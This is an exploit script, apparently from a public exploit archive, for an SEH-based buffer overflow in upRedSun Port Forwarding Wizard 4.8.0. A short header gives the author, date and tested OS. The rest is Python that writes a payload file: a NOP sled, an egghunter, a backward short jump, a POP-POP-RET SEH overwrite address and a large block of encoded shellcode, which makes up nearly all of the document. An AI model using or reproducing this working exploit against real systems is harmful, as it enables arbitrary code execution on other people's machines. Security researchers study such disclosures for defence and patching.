# Exploit Title: Port Forwarding Wizard 4.8.0 - SEH based Buffer Overflow in Register 
# Buffer overflow in upRedSun Port Forwarding Wizard 4.8.0 and earlier version allows local attackers to execute arbitrary code via a long request in the Register feature.
# Exploit Author: Sarang Tumne @SarT
# Date: 18th July, 2020
# CVE ID: -
# Confirmed on release 4.8.0 and 4.5.0
# Vendor: http://www.port-forwarding.net/
# Tested on OS- Windows Vista

###############################################

#!/usr/bin/python

file=open("payload.txt","w+b")

buffer="\x90"*164
buffer+="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x73\x61\x72\x61\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"  # EggHunter
buffer+="\x90"*20

shellcode="sarasara" 		#Egg tag- sarasara
shellcode+="\x90"*40
shellcode+=("\xdd\xc7\xd9\x74\x24\xf4\x58\x50\x59\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x6b"
"\x4c\x6d\x38\x6c\x42\x53\x30\x57\x70\x33\x30\x51\x70\x6e\x69"
"\x78\x65\x36\x51\x6f\x30\x35\x34\x4e\x6b\x52\x70\x54\x70\x4e"
"\x6b\x46\x32\x76\x6c\x6c\x4b\x70\x52\x62\x34\x6e\x6b\x33\x42"
"\x54\x68\x66\x6f\x4e\x57\x71\x5a\x34\x66\x70\x31\x49\x6f\x4e"
"\x4c\x57\x4c\x65\x31\x61\x6c\x37\x72\x54\x6c\x55\x70\x59\x51"
"\x48\x4f\x44\x4d\x43\x31\x4a\x67\x49\x72\x5a\x52\x33\x62\x70"
"\x57\x4c\x4b\x50\x52\x56\x70\x6c\x4b\x73\x7a\x35\x6c\x4c\x4b"
"\x50\x4c\x42\x31\x70\x78\x49\x73\x53\x78\x46\x61\x4a\x71\x52"
"\x71\x4e\x6b\x30\x59\x71\x30\x55\x51\x4a\x73\x4e\x6b\x71\x59"
"\x36\x78\x78\x63\x35\x6a\x37\x39\x6c\x4b\x77\x44\x6e\x6b\x76"
"\x61\x39\x46\x76\x51\x59\x6f\x6e\x4c\x4a\x61\x78\x4f\x54\x4d"
"\x77\x71\x5a\x67\x36\x58\x79\x70\x54\x35\x69\x66\x74\x43\x51"
"\x6d\x58\x78\x55\x6b\x43\x4d\x46\x44\x70\x75\x5a\x44\x50\x58"
"\x4e\x6b\x62\x78\x65\x74\x73\x31\x6b\x63\x42\x46\x6c\x4b\x36"
"\x6c\x50\x4b\x4e\x6b\x42\x78\x65\x4c\x33\x31\x69\x43\x4c\x4b"
"\x47\x74\x4e\x6b\x77\x71\x78\x50\x4c\x49\x50\x44\x76\x44\x66"
"\x44\x43\x6b\x61\x4b\x31\x71\x51\x49\x63\x6a\x43\x61\x39\x6f"
"\x49\x70\x61\x4f\x73\x6f\x53\x6a\x4e\x6b\x37\x62\x68\x6b\x6c"
"\x4d\x63\x6d\x45\x38\x56\x53\x30\x32\x47\x70\x47\x70\x55\x38"
"\x62\x57\x74\x33\x67\x42\x31\x4f\x61\x44\x33\x58\x50\x4c\x31"
"\x67\x35\x76\x64\x47\x39\x6f\x6b\x65\x6f\x48\x6a\x30\x37\x71"
"\x73\x30\x67\x70\x57\x59\x48\x44\x30\x54\x66\x30\x75\x38\x67"
"\x59\x6d\x50\x32\x4b\x35\x50\x4b\x4f\x6a\x75\x76\x30\x30\x50"
"\x50\x50\x36\x30\x37\x30\x36\x30\x43\x70\x52\x70\x31\x78\x78"
"\x6a\x56\x6f\x49\x4f\x69\x70\x4b\x4f\x39\x45\x5a\x37\x31\x7a"
"\x44\x45\x61\x78\x49\x50\x39\x38\x56\x58\x30\x6c\x73\x58\x55"
"\x52\x73\x30\x56\x71\x43\x6c\x4c\x49\x4b\x56\x30\x6a\x56\x70"
"\x43\x66\x70\x57\x31\x78\x5a\x39\x49\x35\x62\x54\x50\x61\x39"
"\x6f\x7a\x75\x4f\x75\x6f\x30\x73\x44\x46\x6c\x4b\x4f\x70\x4e"
"\x76\x68\x61\x65\x5a\x4c\x53\x58\x68\x70\x4f\x45\x79\x32\x46"
"\x36\x59\x6f\x4a\x75\x63\x58\x32\x43\x52\x4d\x61\x74\x57\x70"
"\x6b\x39\x4a\x43\x63\x67\x76\x37\x63\x67\x64\x71\x69\x66\x62"
"\x4a\x46\x72\x73\x69\x61\x46\x6a\x42\x6b\x4d\x63\x56\x4a\x67"
"\x71\x54\x71\x34\x67\x4c\x47\x71\x46\x61\x6c\x4d\x53\x74\x37"
"\x54\x46\x70\x38\x46\x63\x30\x37\x34\x70\x54\x50\x50\x36\x36"
"\x61\x46\x52\x76\x53\x76\x53\x66\x50\x4e\x46\x36\x33\x66\x36"
"\x33\x42\x76\x52\x48\x70\x79\x68\x4c\x37\x4f\x4f\x76\x59\x6f"
"\x38\x55\x4f\x79\x6b\x50\x70\x4e\x32\x76\x77\x36\x49\x6f\x46"
"\x50\x55\x38\x44\x48\x6d\x57\x47\x6d\x61\x70\x59\x6f\x6e\x35"
"\x4d\x6b\x4b\x4e\x74\x4e\x64\x72\x39\x7a\x72\x48\x4e\x46\x6c"
"\x55\x6f\x4d\x6d\x4d\x59\x6f\x48\x55\x65\x6c\x66\x66\x71\x6c"
"\x37\x7a\x6f\x70\x79\x6b\x6d\x30\x54\x35\x66\x65\x6f\x4b\x47"
"\x37\x46\x73\x53\x42\x72\x4f\x72\x4a\x55\x50\x66\x33\x49\x6f"
"\x39\x45\x41\x41")
buffer+="\xeb\xb6\x90\x90"   #Backward short jump- nseh
buffer+="\x6d\x57\x37\x7c"   #PPR- SEH
buffer+="A"*200
file.write(buffer+shellcode)
file.close()
